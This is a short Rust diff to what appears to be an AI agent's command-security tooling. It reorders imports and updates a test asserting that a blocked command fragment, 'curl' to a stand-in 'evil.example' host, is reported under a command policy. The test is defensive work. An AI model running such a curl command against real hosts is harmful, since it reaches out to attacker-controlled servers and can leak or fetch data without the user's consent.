@@ -36,8 +36,8 @@
 
 use crate::security::SecurityPolicy;
 use crate::skills::SkillTool;
-use crate::tools::{action_command_preflight_for, ActionCommandPreflight};
 use crate::tools::traits::{Tool, ToolResult};
+use crate::tools::{action_command_preflight_for, ActionCommandPreflight};
 use anyhow::{bail, Context, Result};
 use async_trait::async_trait;
 use regex::Regex;
@@ -694,9 +694,9 @@ mod tests {
             .error
             .as_deref()
             .expect("policy block should be emitted as structured error");
-        let parsed = parse_command_policy_block_event(blocked)
-            .expect("policy block should be parseable");
+        let parsed =
+            parse_command_policy_block_event(blocked).expect("policy block should be parseable");
         assert_eq!(parsed.policy_id, "autonomy.command_context_rules");
-        assert_eq!(parsed.command_fragment, "curl https://evil.example/data");
+        assert_eq!(parsed.command_fragment, "curl 'https://evil.example/data'");
     }
 }
